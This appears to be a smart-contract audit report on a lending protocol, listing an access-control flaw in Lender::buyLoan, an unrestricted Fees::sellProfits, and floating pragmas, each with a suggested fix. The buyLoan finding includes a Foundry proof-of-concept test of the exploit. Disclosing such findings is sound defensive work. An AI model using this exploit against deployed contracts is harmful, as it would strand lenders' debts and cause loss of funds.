### [H-1] `Lender::buyLoan` allows anyone one with no ownership to a pool to buy a loan, Leading to irrecoverable debts to pools.

**Description:**
When a loan is put on an auction an attacker can buy the loan to another pool even though he has no ownership of the loan and the lender address changes to the attacker.`L#522: loans[loanId].lender = msg.sender;` and also increasing the debt of victim's pool. And If a borrower wants to repay the loan he cannot because the poolId is now calculated with the attacker address, which doesn't exist. So all state changes made using the pool address will fail.

In `Lender::buyLoan`, caller is set as the lender of the loan which will be the attacker here.

```solidity
// update the loan with the new info
@>  loans[loanId].lender = msg.sender;
    loans[loanId].interestRate = pools[poolId].interestRate;
    loans[loanId].startTimestamp = block.timestamp;
    loans[loanId].auctionStartTimestamp = type(uint256).max;
    loans[loanId].debt = totalDebt;

```

In `Lender::repay`, poolId calculated with attacker address and all calls operations with the poolId reverts.

```solidity
bytes32 poolId = getPoolId(
    loan.lender,
    loan.loanToken,
    loan.collateralToken
);

//update the pool balance
_updatePoolBalance(
    poolId,
    pools[poolId].poolBalance + loan.debt
    + lenderInterest
);

pools[poolId].outstandingLoans -= loan.debt;
```

**Impact**
An attacker can call buy loan and take ownership of the loan and all debts on that loan can't be paid and the lender will lose funds.

**Proof of Concept**

<summary>POC:</summary>

```solidity
 function test__buyLoansEvenIfCallerDoesNotHaveAPool() public {
        test_borrow();

        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;

        //accrue interest
        vm.warp(block.timestamp + 364 days + 12 hours);
        // kick off auction
        vm.startPrank(lender1);

        lender.startAuction(loanIds);

        vm.startPrank(lender2);

        Pool memory p = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100 * 10 ** 18,
            poolBalance: 1000 * 10 ** 18,
            maxLoanRatio: 2 * 10 ** 18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);
        vm.stopPrank();

        Pool memory lenderPool = lender.getPool(
            lender.getPoolId(
                lender1,
                address(loanToken),
                address(collateralToken)
            )
        );
        Pool memory lenderPool2 = lender.getPool(
            lender.getPoolId(
                lender2,
                address(loanToken),
                address(collateralToken)
            )
        );

        // warp to middle of auction
        vm.warp(block.timestamp + 24 hours);

        vm.startPrank(attacker);
        lender.buyLoan(0, poolId);
        vm.stopPrank();

        Pool memory attackerPool = lender.getPool(
            lender.getPoolId(
                attacker,
                address(loanToken),
                address(collateralToken)
            )
        );

        vm.startPrank(borrower);
        loanToken.mint(address(borrower), 5 * 10 ** 17);
        lender.repay(loanIds);
    }

```

Output :

```solidity
[FAIL. Reason: panic: arithmetic underflow or overflow (0x11)] test__buyLoansEvenIfCallerDoesNotHaveAPool()
```

**Recommended Mitigation:**
The protocol needs to add a check in the `Lender::buyLoan` function : if the caller is a the lender of the pool, if not it should revert.

```diff
function buyLoan(uint256 loanId, bytes32 poolId) public {
    ...
+   if (pools[poolId].lender != msg.sender) revert Unauthorized();
    ...

    }
```

### [L-1] `Fees::sellProfits` is missing a restriction, Protocol funds can be called by anyone to swap profits to WETH.

**Description:**

The `Fees::sellProfits` can be called by anyone to swap all protocol fees to WETH. Say maybe the attacker see that WETH prices tracking down, he could just sell all the profits to WETH there by reducing the value of the profits, although the protocol could swap back but some funds might be lost.

**Impact:**
There could be possible loss of value of funds that is if WETH prices are tracking down.

**Recommended Mitigation:**
The protocol can import Openzeppelin's Ownable2Step and add the onlyOwner modifier to the `Fees::sellProfits`, meaning only the owner can call the function

```diff
-   function sellProfits(address _profits) public {
+   function sellProfits(address _profits) public onlyOwner{
```

### [I-2] Floating pragmas

**Description:**
Contracts should use strict versions of solidity. Locking the version ensures the contract are not deployed with a different version than they were tested with. An incorrect version could lead to unintended results.

**Recommended Mitigation:**
Lock up pragma versions.

```diff
-   pragma solidity ^0.8.19;
+   pragma solidity 0.8.19;
```

### [I-3] No `address(0)` checks
